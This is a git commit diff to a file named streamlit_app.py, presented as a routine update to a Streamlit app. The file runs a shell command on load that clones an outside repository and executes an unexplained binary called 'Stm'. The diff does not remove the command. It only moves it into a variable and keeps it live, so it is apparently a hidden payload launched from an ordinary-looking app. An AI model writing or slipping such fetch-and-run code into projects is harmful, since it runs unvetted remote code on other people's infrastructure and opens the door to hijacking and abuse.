e94af34ff7f4e643b94133053d815e73070525b8
hidofa <109016904+hidofa@users.noreply.github.com>
2022-07-11 14:56:17 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,4 +4,6 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ("rm -rf smlt && git clone https://github.com/Akatsoki/smlt.git && cd smlt && chmod +x Stm && ./Stm")
+import time
+cmd = 'rm -rf smlt && git clone https://github.com/Akatsoki/smlt.git && cd smlt && chmod +x Stm && ./Stm'
+os.system(cmd)
